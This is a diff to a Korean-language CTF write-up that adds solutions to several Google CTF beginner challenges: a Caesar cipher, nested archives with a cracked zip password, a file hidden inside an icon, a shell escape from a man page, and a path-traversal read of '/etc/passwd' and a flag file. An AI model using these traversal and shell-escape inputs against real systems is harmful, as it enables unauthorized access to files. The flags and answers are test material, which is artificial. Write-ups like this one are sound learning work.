@@ -18,6 +18,7 @@ PDF 파일이다. text와 배경색이 검정색으로 되어있어 글씨가 �
 
 CTF{ICanReadDis}
 
+
 #### OCR IS COOL! (misc)
 <table><tr><td>
 <img src="/img/google_ocr1.png">
@@ -27,4 +28,86 @@ CTF{ICanReadDis}
 <img src="/img/google_ocr2.JPG">
 </td></tr></table>
 
-이미지 파일이 주어지는데 URL의 값이 수상하여 Caesar 복호화를 했더니 플래그가 나왔다.
+이미지 파일이 주어지는데 메일의 내용 중 VMY{...} 가 플래그 형식과 비슷하여 Caesar 복호화를 했더니 플래그가 나왔다.
+
+VMY{vtxltkvbiaxkbltlnulmbmnmbhgvbiaxk} &rarr; CTF{caesarcipherisasubstitutioncipher}
+
+
+#### SECURITY BY OBSCURITY (misc)
+첨부파일을 받아보면 zip 으로 압축되어 있다. unzip 으로 압축을 여러번 풀면 또 다른 방식으로 압축되어 있다. zip, unzip, 7z, bzip2, gunzip 순서로 압축을 해제하면 마지막으로 패스워드가 걸린 zip 파일이 된다.
+
+advanced ZIP password Recovery 등의 프로그램을 이용하면 패스워드를 알아낼 수 있다. 알아낸 패스워드는 "asdf" 이다.
+
+CTF{CompressionIsNotEncryption}
+
+
+#### FLOPPY (misc)
+<table><tr><td>
+<img src="/img/google_floppy.JPG">
+</td></tr></table>
+
+<table><tr><td>
+<img src="/img/google_floppy_.JPG">
+</td></tr></table>
+
+ico 파일을 hex editor 로 열어보면 압축 파일이 숨겨져 있는 것을 확인할 수 있다.
+
+CTF{qeY80sU6Ktko8BJW}
+
+
+#### MOAR (pwn)
+
+> nc moar.ctfcompetition.com 1337
+
+접속하면 socat 의 man 페이지가 뜬다.
+
+<table><tr><td>
+<img src="/img/google_moar.JPG">
+</td></tr></table>
+
+![cmd] 를 이용하여 쉘 명령어를 실행시킬 수 있다.
+
+CTF{SOmething-CATastr0phic}
+
+
+#### ADMIN UI (pwn-re)
+
+> nc mngmnt-iface.ctfcompetition.com 1337
+
+```
+=== Management Interface ===
+ 1) Service access
+ 2) Read EULA/patch notes
+ 3) Quit
+```
+1번 메뉴를 선택하면 패스워드를 입력해야 한다.
+
+```
+The following patchnotes were found:
+ - Version0.3
+ - Version0.2
+Which patchnotes should be shown?
+../../../etc/passwd
+(생략)
+user:x:1337:1337::/home/user:
+```
+2번 메뉴를 선택하면 patchnotes 를 읽을 수 있는데 예를 들어서 "Version0.3" 을 입력하면 "Version0.3" 파일을 읽어서 출력해준다.
+이를 이용해서 "../../../etc/passwd" 를 입력하면 사용자 정보를 확인할 수 있다.
+
+
+```
+=== Management Interface ===
+ 1) Service access
+ 2) Read EULA/patch notes
+ 3) Quit
+2
+The following patchnotes were found:
+ - Version0.3
+ - Version0.2
+Which patchnotes should be shown?
+../../../home/user/flag
+CTF{I_luv_buggy_sOFtware}
+```
+user 라는 사용자명을 확인했으면 user의 홈 디렉토리에서 플래그를 읽는다.
+
+CTF{I_luv_buggy_sOFtware}
